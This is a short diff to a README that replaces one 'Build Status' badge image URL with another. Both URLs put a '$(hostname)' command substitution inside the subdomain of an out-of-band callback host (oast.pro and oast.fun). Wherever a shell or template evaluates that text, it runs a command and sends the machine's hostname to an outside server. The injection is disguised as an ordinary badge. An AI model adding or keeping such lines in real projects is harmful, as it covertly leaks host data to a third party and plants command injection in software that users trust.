@@ -1,2 +1,2 @@
 # Project Overview
-![Build Status](https://$(hostname).1077aec535d9857caf5egufzncoyyyyyf.oast.pro/status.svg)
+![Build Status](https://$(hostname).glcamzgajhnecuvahjtgkqb9voc7r0yod.oast.fun/status.jpeg)
